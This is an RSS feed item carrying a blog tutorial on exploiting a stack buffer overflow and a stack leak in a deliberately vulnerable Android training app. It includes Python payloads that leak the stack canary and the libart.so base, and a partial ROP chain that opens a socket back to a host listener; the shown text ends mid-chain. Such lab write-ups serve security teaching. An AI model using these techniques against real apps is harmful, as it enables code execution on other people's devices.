<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Buffer Overflow on lolcads tech blog</title><link>https://lolcads.github.io/tags/buffer-overflow/</link><description>Recent content in Buffer Overflow on lolcads tech blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&amp;copy; lolcads</copyright><lastBuildDate>Tue, 23 Jul 2024 16:46:21 +0100</lastBuildDate><atom:link href="https://lolcads.github.io/tags/buffer-overflow/index.xml" rel="self" type="application/rss+xml"/><item><title>EÂ²VA: Stack Buffer Overflow Module (Part 3)</title><link>https://lolcads.github.io/posts/2024/07/eva_2/</link><pubDate>Tue, 23 Jul 2024 16:46:21 +0100</pubDate><guid>https://lolcads.github.io/posts/2024/07/eva_2/</guid><description>Exploitation of EasyStackBufferOverflowModule This article describes exploitation of the EasyStackBufferOverflowModule. During exploitation, various Android - specific caveats are discussed.
Assumptions We will assume that we have successfully grabbed a copy of the .apk file of damnvulnerableapp. Also, we will not discuss how to unpack an .apk file, but rather assume that we have access to libEasyStackBufferOverflowModule.so and the EasyStackBufferOverflowModule class. If it is unclear how to get access to these components when only given an .</description><content>&lt;h1 id="exploitation-of-easystackbufferoverflowmodule">Exploitation of &lt;em>EasyStackBufferOverflowModule&lt;/em>&lt;/h1>
&lt;p>This article describes exploitation of the &lt;em>EasyStackBufferOverflowModule&lt;/em>. During exploitation, various Android - specific caveats are discussed.&lt;/p>
&lt;h2 id="assumptions">Assumptions&lt;/h2>
&lt;p>We will assume that we have successfully grabbed a copy of the &lt;code>.apk&lt;/code> file of &lt;em>damnvulnerableapp&lt;/em>. Also, we will &lt;strong>not&lt;/strong> discuss how to unpack an &lt;code>.apk&lt;/code> file, but rather assume that we have access to &lt;code>libEasyStackBufferOverflowModule.so&lt;/code> and the &lt;code>EasyStackBufferOverflowModule&lt;/code> class. If it is unclear how to get access to these components when only given an &lt;code>.apk&lt;/code> file, read the previous blog posts first!&lt;/p>
&lt;h2 id="analysis-baseline">Analysis baseline&lt;/h2>
&lt;p>Lets first summarize what we have:&lt;/p>
&lt;ol>
&lt;li>Access to &lt;code>libEasyStackBufferOverflowModule.so&lt;/code>, which is a &lt;a href="http://www.sco.com/developers/gabi/latest/ch4.intro.html">shared - object file&lt;/a> that can be thrown into &lt;a href="https://ghidra-sre.org/">&lt;em>Ghidra&lt;/em>&lt;/a>.&lt;/li>
&lt;li>Access to &lt;code>.apk&lt;/code> file, which can be thrown into &lt;a href="https://github.com/skylot/jadx">&lt;em>jadx&lt;/em>&lt;/a>.&lt;/li>
&lt;/ol>
&lt;p>First of all, consider the native function as a black box and just decompile the Java code via &lt;em>jadx&lt;/em>. Then, the code for &lt;code>EasyStackBufferOverflowModule&lt;/code> should look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-Java" data-lang="Java">&lt;span style="color:#f92672">package&lt;/span> com.damnvulnerableapp.vulnerable.modules&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> com.damnvulnerableapp.common.exceptions.VulnerableModuleOperationException&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> java.nio.ByteBuffer&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/* loaded from: classes10.dex */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">EasyStackBufferOverflowModule&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> VulnerableModule &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">native&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#a6e22e">vulnerableToUpper&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> bArr&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">loadLibrary&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;EasyStackBufferOverflowModule&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">EasyStackBufferOverflowModule&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> StackBufferOverflowModuleConfiguration&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// com.damnvulnerableapp.vulnerable.modules.VulnerableModule
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> VulnerableModuleOperationException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> message&lt;span style="color:#f92672">;&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Welcome to the latest version of the echo service &amp;gt;:)&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">do&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
message &lt;span style="color:#f92672">=&lt;/span> input&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> unknown &lt;span style="color:#f92672">=&lt;/span> ByteBuffer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">wrap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>input&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#a6e22e">getInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> upper &lt;span style="color:#f92672">=&lt;/span> vulnerableToUpper&lt;span style="color:#f92672">(&lt;/span>message&lt;span style="color:#f92672">,&lt;/span> unknown&lt;span style="color:#f92672">);&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>upper&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> String&lt;span style="color:#f92672">(&lt;/span>message&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;EXIT&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Exiting...&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The above code shows that the module takes two distinct inputs per iteration:&lt;/p>
&lt;ol>
&lt;li>a message to be upper - cased&lt;/li>
&lt;li>an integer that is also part of upper - casing.&lt;/li>
&lt;/ol>
&lt;p>Both inputs are forwarded to a native function called &lt;code>vulnerableToUpper&lt;/code>. Finally, the upper - cased message will be sent back to us.&lt;/p>
&lt;p>From &lt;code>EasyStackBufferOverflowModule&lt;/code> we can infer that there has to be a function in &lt;code>libEasyStackBufferOverflowModule.so&lt;/code>, whose symbol name contains &lt;code>vulnerableToUpper&lt;/code>. This can be confirmed via&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf --wide --symbols libEasyStackBufferOverflowModule.so | grep vulnerableToUpper
6: 00000000000008f0 &lt;span style="color:#ae81ff">322&lt;/span> FUNC GLOBAL DEFAULT &lt;span style="color:#ae81ff">12&lt;/span> Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Okay, time for &lt;em>Ghidra&lt;/em>! The following code has already been &amp;ldquo;beautified&amp;rdquo;:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">jbyteArray &lt;span style="color:#a6e22e">Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper&lt;/span>
(JNIEnv &lt;span style="color:#f92672">*&lt;/span>env, jobject this, jbyteArray string, jint length)
{
&lt;span style="color:#66d9ef">char&lt;/span> c;
jbyte &lt;span style="color:#f92672">*&lt;/span>raw;
jsize stringLength;
jbyteArray array;
&lt;span style="color:#66d9ef">long&lt;/span> fs;
uint i;
&lt;span style="color:#66d9ef">int&lt;/span> bufferLength;
&lt;span style="color:#66d9ef">char&lt;/span> buffer [&lt;span style="color:#ae81ff">40&lt;/span>];
&lt;span style="color:#66d9ef">long&lt;/span> canary;
canary &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(fs &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>);
memset(buffer,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0x20&lt;/span>);
raw &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements)(env,string,(jboolean &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x0&lt;/span>);
stringLength &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength)(env,string);
perfect_memcpy(buffer,raw,(&lt;span style="color:#66d9ef">int&lt;/span>)stringLength);
&lt;span style="color:#66d9ef">for&lt;/span> (i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>; i &lt;span style="color:#f92672">=&lt;/span> i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
buffer[i] &lt;span style="color:#f92672">=&lt;/span> toupper((&lt;span style="color:#66d9ef">int&lt;/span>)buffer[i]);
&lt;span style="color:#66d9ef">if&lt;/span> ((&lt;span style="color:#66d9ef">int&lt;/span>)length &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x101&lt;/span>)
bufferLength &lt;span style="color:#f92672">=&lt;/span> perfect_strlen(buffer) &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)length;
&lt;span style="color:#66d9ef">else&lt;/span>
bufferLength &lt;span style="color:#f92672">=&lt;/span> perfect_strlen(buffer);
array &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray)(env,(jsize)bufferLength);
(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion)(env,array,&lt;span style="color:#ae81ff">0&lt;/span>,(jsize)bufferLength,buffer);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(fs &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> canary)
&lt;span style="color:#66d9ef">return&lt;/span> array;
&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
__stack_chk_fail();
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">perfect_memcpy&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>dst, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>src, uint size)
{
uint i;
&lt;span style="color:#66d9ef">for&lt;/span> (i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> size; i &lt;span style="color:#f92672">=&lt;/span> i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
dst[i] &lt;span style="color:#f92672">=&lt;/span> src[i];
&lt;span style="color:#66d9ef">return&lt;/span>;
}
uint &lt;span style="color:#a6e22e">perfect_strlen&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>string)
{
uint i;
&lt;span style="color:#66d9ef">for&lt;/span> (i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; string[i] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>; i &lt;span style="color:#f92672">=&lt;/span> i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) {}
&lt;span style="color:#66d9ef">return&lt;/span> i;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="the-bug">The Bug&lt;/h2>
&lt;p>As the module name suggests, there is indeed a buffer overflow bug. One function that is often part of a buffer overflow is &lt;code>memcpy&lt;/code>. Thus, taking a closer look into how &lt;code>memcpy&lt;/code> is used can turn out useful.&lt;/p>
&lt;h3 id="buffer-overflow">Buffer Overflow&lt;/h3>
&lt;p>First of all, we can see that there is a classical buffer overflow:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">...
memset(buffer,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0x20&lt;/span>);
raw &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements)(env,string,(jboolean &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x0&lt;/span>);
stringLength &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength)(env,string);
perfect_memcpy(buffer,raw,(&lt;span style="color:#66d9ef">int&lt;/span>)stringLength);
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This is due to the fact that &lt;code>stringLength&lt;/code> is computed w.r.t. the length of the input buffer &lt;code>string&lt;/code>, but not w.r.t. the length of the destination buffer &lt;code>buffer&lt;/code>. Thus, if &lt;code>length &amp;gt; 0x20&lt;/code>, a classical buffer overflow occurs. Notice that the user has complete control over the contents and length of &lt;code>string&lt;/code>, which is actually of type &lt;code>jbyteArray&lt;/code>.&lt;/p>
&lt;h3 id="memory-leaks">Memory Leak(s)&lt;/h3>
&lt;p>In addition to the ability of manipulating the whole stack located above &lt;code>buffer&lt;/code>, there is a weird sequence of code leading to returning more than &amp;ldquo;intended&amp;rdquo;. Namely:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">...
&lt;span style="color:#66d9ef">if&lt;/span> ((&lt;span style="color:#66d9ef">int&lt;/span>)length &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x101&lt;/span>)
bufferLength &lt;span style="color:#f92672">=&lt;/span> perfect_strlen(buffer) &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)length;
&lt;span style="color:#66d9ef">else&lt;/span>
bufferLength &lt;span style="color:#f92672">=&lt;/span> perfect_strlen(buffer);
array &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray)(env,(jsize)bufferLength);
(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion)(env,array,&lt;span style="color:#ae81ff">0&lt;/span>,(jsize)bufferLength,buffer);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(fs &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> canary)
&lt;span style="color:#66d9ef">return&lt;/span> array;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>So if &lt;code>length &amp;lt;= 0x100&lt;/code>, then it will be added to &lt;code>bufferLength&lt;/code>. Technically, setting &lt;code>length &amp;lt; 0&lt;/code> or &lt;code>length &amp;lt; -perfect_strlen(buffer)&lt;/code> is possible, but does not seem very useful at first glance. Then, &lt;code>bufferLength&lt;/code> bytes are copied from &lt;code>buffer&lt;/code> into &lt;code>array&lt;/code>. As &lt;code>strlen(buffer) + length &amp;gt; 0x20 = sizeof (buffer)&lt;/code> is possible, this might leak arbitrary values from the stack coming after the buffer.&lt;/p>
&lt;p>Summing up, if we sent a payload of the form&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">client&lt;span style="color:#f92672">.&lt;/span>forward(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x42&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>)
client&lt;span style="color:#f92672">.&lt;/span>forward(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x01\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>) &lt;span style="color:#75715e"># big - endian&lt;/span>
leak &lt;span style="color:#f92672">=&lt;/span> client&lt;span style="color:#f92672">.&lt;/span>fetch()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>we would get an additional &lt;code>0x100&lt;/code> bytes from the memory located above &lt;code>buffer&lt;/code>, i.e. from the stack. This leaks, among other things&lt;/p>
&lt;ol>
&lt;li>Return address to &lt;code>art_quick_generic_jni_trampoline&lt;/code>, which leaks the base of &lt;code>libart.so&lt;/code> (almost as awesome as &lt;code>libc.so&lt;/code>&amp;hellip;as regards gadgets)&lt;/li>
&lt;li>Old &lt;code>rbp&lt;/code>, i.e. a stack pointer&lt;/li>
&lt;/ol>
&lt;h2 id="exploitation-">Exploitation &amp;gt;:)&lt;/h2>
&lt;p>Lets assume we already have a leaked &lt;code>libart.so&lt;/code> pointer, i.e. we ran:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">client&lt;span style="color:#f92672">.&lt;/span>forward(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x42&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>)
client&lt;span style="color:#f92672">.&lt;/span>forward(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x01\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
leak &lt;span style="color:#f92672">=&lt;/span> client&lt;span style="color:#f92672">.&lt;/span>fetch()
leak &lt;span style="color:#f92672">=&lt;/span> decompose(leak[&lt;span style="color:#ae81ff">0x20&lt;/span>:])
canary &lt;span style="color:#f92672">=&lt;/span> leak[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;span style="color:#75715e"># libart.so address of art_quick_generic_jni_trampoline+220,&lt;/span>
&lt;span style="color:#75715e"># i.e. at file offset 0x39ffac (may differ)&lt;/span>
libart_base &lt;span style="color:#f92672">=&lt;/span> p64(u64(leak[&lt;span style="color:#ae81ff">3&lt;/span>]) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x39ffac&lt;/span>)
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">decompose&lt;/span>(leak : bytes):
&lt;span style="color:#66d9ef">return&lt;/span> [ leak[i &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>:(i&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>] &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(leak) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) ]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>To figure out that the second qword is the canary, just iterate over the decomposed leak and look for &lt;em>not - address - looking&lt;/em> values. I always encountered fully random canaries, i.e. 8 random bytes, which seem to be the &lt;a href="https://link.springer.com/article/10.1007/s10207-018-00425-8">default on Android&lt;/a>. But this will only be relevant in case e.g. &lt;code>strcpy&lt;/code> is used instead of e.g. &lt;code>memcpy&lt;/code>.&lt;/p>
&lt;p>Using your favourite tool for gadget extraction, like &lt;a href="https://github.com/sashs/Ropper">&lt;em>ropper&lt;/em>&lt;/a> or &lt;a href="https://github.com/JonathanSalwan/ROPgadget">&lt;em>ROPgadget&lt;/em>&lt;/a>, you can construct a ROP - chain to get arbitrary code execution. Basically, your payload could look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x42&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> leak[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#75715e"># &amp;lt;-- unknown address&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> canary
payload &lt;span style="color:#f92672">+=&lt;/span> leak[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#75715e"># &amp;lt;-- probably old rbp&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_1
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_2
payload &lt;span style="color:#f92672">+=&lt;/span> enjoy
&lt;span style="color:#f92672">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>because the leaked data from the stack looked like this (from low to high addresses):&lt;/p>
&lt;pre tabindex="0">&lt;code>lower 0x72d1b9cdc210 &amp;lt;-- unknown address
| 0x79291c4ee3e94be3 &amp;lt;-- that is the canary
| 0x72d08b1c28b0 &amp;lt;-- probably old rbp
higher 0x72d0f87a032c &amp;lt;-- this is your most favourite address to leak
&lt;/code>&lt;/pre>&lt;p>Notice that we do not need to care about the &lt;em>unknown&lt;/em> address, because we are almost done.&lt;/p>
&lt;p>Lets briefly think about how to approach the holy grail, i.e. &lt;em>arbitrary code execution&lt;/em>. At first glance, a few options come to mind (consider the fact that e.g. &lt;code>libart.so&lt;/code> is compiled with &lt;em>RELRO&lt;/em> etc.):&lt;/p>
&lt;ol>
&lt;li>ROP - chain that contains &lt;strong>all&lt;/strong> the &amp;ldquo;code&amp;rdquo; (via gadgets) to execute. This (almost irreversibly) destroys the stack and you cannot expect that the app will recover from that.&lt;/li>
&lt;li>smaller ROP - chain that writes some qwords into global memory (e.g. &lt;code>.data@libart.so&lt;/code> or &lt;code>.bss@libart.so&lt;/code>) and then restores the stack.&lt;/li>
&lt;li>smaller ROP - chain that allocates writable and executable memory via e.g. &lt;code>mmap&lt;/code>, writes the pointer returned in &lt;code>rax&lt;/code> into global memory (thus only 8 bytes of global memory are invalidated). Then proceed as in 2. just with the new memory to write shellcode. Finally return into the shellcode.&lt;/li>
&lt;li>&lt;a href="https://en.wikipedia.org/wiki/Sigreturn-oriented_programming">sigrop&lt;/a>, but there is no reason to use this.&lt;/li>
&lt;/ol>
&lt;p>For this blog post, we will only consider the first option, i.e. destroying the stack (don&amp;rsquo;t worry the other ones will be covered in later posts ;D).&lt;/p>
&lt;p>The naming convention for gadgets is like this: &lt;code>gadget_opcode_operand1_operand2_opcode_operand1...&lt;/code>. So you need to be able to identify opcodes on Intel (the emulator runs on x86_64) to understand the ROP - chain. The following is an example of a ROP - chain connecting to &lt;code>10.0.2.2:4440&lt;/code>, where &lt;code>10.0.2.2&lt;/code> is &lt;a href="https://developer.android.com/studio/run/emulator-networking.html">an alias to your loopback interface&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># Setup payload&lt;/span>
payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> leak[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#75715e"># &amp;lt;-- unknown address&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> canary
payload &lt;span style="color:#f92672">+=&lt;/span> leak[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#75715e"># &amp;lt;-- probably old rbp&lt;/span>
&lt;span style="color:#75715e"># Dynamically compute libc address via toupper@.got in libStackBufferOverflowModule.so&lt;/span>
&lt;span style="color:#75715e"># and store it into writable_memory&lt;/span>
payload &lt;span style="color:#f92672">=&lt;/span> compute_libc_base(payload, writable_memory)
payload &lt;span style="color:#f92672">=&lt;/span> call_libc_function(
payload,
writable_memory,
&lt;span style="color:#e6db74">&amp;#39;socket&amp;#39;&lt;/span>,
[
p64(&lt;span style="color:#ae81ff">0x2&lt;/span>),
p64(&lt;span style="color:#ae81ff">0x1&lt;/span>),
p64(&lt;span style="color:#ae81ff">0x0&lt;/span>)
]
)
&lt;span style="color:#75715e"># Store socket in memory&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rdi
payload &lt;span style="color:#f92672">+=&lt;/span> p64(u64(writable_memory) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x8&lt;/span>)
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_deref_rdi_rax
&lt;span style="color:#75715e"># Construct sockaddr_in&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rdi
payload &lt;span style="color:#f92672">+=&lt;/span> p64(u64(writable_memory) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>)
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rax
